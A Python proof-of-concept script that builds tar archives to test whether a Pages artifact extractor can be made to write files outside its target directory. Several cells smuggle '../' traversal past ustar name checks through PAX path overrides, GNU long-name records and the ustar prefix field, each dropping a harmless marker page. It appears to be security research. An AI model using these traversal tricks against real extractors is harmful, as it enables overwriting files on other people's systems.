#!/usr/bin/env python3
"""
Build one artifact.tar per PoC cell for the Pages-extractor member-name differential.

Every cell produces an UNCOMPRESSED tar, exactly the container
actions/upload-pages-artifact@98ef48e4 action.yml:33-40 produces
(`tar --dereference --hard-dereference -cvf $RUNNER_TEMP/artifact.tar ... .`).

Cells:
  i    baseline  -- ./index.html only.                      Proves the harness deploys.
  ii   CONTROL   -- ustar name field literally './../<f>'.   Per deploy-pages#203 this MUST be rejected.
  iii  candidate -- PAX 'path=' override; every ustar name './'-prefixed and '..'-free.
  iv   candidate -- GNU '@LongLink' (L) override, >100 byte name so the ustar field truncates.
"""
import io, sys, tarfile, time
from ustar import hdr, pad

NONCE = sys.argv[2] if len(sys.argv) > 2 else "n0"
cell = sys.argv[1]
out = "artifact.tar"

INDEX = ("<!doctype html><title>lane3 harness</title>"
         "<h1>CELL-%s-INDEX-OK-%s</h1>\n" % (cell, NONCE)).encode()
ESCAPE = ("<!doctype html><title>escaped</title>"
          "<h1>CELL-%s-ESCAPED-%s</h1>\n" % (cell, NONCE)).encode()

def reg(tf, name, data, pax=None, fmt=None):
    ti = tarfile.TarInfo(name)
    ti.size = len(data); ti.mode = 0o644; ti.mtime = int(time.time())
    ti.uid = ti.gid = 0; ti.uname = ti.gname = ""
    if pax:
        ti.pax_headers = dict(pax)
    tf.addfile(ti, io.BytesIO(data))

if cell == "i":
    with tarfile.open(out, "w", format=tarfile.GNU_FORMAT) as tf:
        reg(tf, "./index.html", INDEX)

elif cell == "ii":
    # ustar header name field holds the traversal LITERALLY. Nothing hidden.
    with tarfile.open(out, "w", format=tarfile.GNU_FORMAT) as tf:
        reg(tf, "./index.html", INDEX)
        reg(tf, "./../ctl-escape-%s.html" % NONCE, ESCAPE)

elif cell == "iii":
    # PAX 'x' extension record carries the authoritative path.
    # ustar name fields in this archive: '././@PaxHeader'  and  './decoy.txt'
    with tarfile.open(out, "w", format=tarfile.PAX_FORMAT) as tf:
        reg(tf, "./index.html", INDEX)
        reg(tf, "./decoy.txt", ESCAPE,
            pax={"path": "../pax-escape-%s.html" % NONCE})

elif cell == "iv":
    # GNU long-name: name >100 bytes -> '././@LongLink' member carries the real
    # name, and the 100-byte ustar field is left holding only './aaaa...'.
    longname = "./" + "a" * 110 + "/../../gnu-escape-%s.html" % NONCE
    with tarfile.open(out, "w", format=tarfile.GNU_FORMAT) as tf:
        reg(tf, "./index.html", INDEX)
        reg(tf, longname, ESCAPE)

elif cell == "v":
    # POSIX ustar name splitting: full name = prefix + "/" + name.
    # Every 100-byte `name` field stays "./"-prefixed and ".."-free; the
    # traversal lives in the 155-byte `prefix` field at offset 345.
    blob = hdr(b"./index.html", len(INDEX)) + pad(INDEX)
    blob += hdr(("./prefix-escape-%s.html" % NONCE).encode(), len(ESCAPE),
                prefix=b"..") + pad(ESCAPE)
    blob += b"\0" * 1024
    open(out, "wb").write(blob)

else:
    raise SystemExit("unknown cell %r" % cell)
print("built cell %s -> %s" % (cell, out))
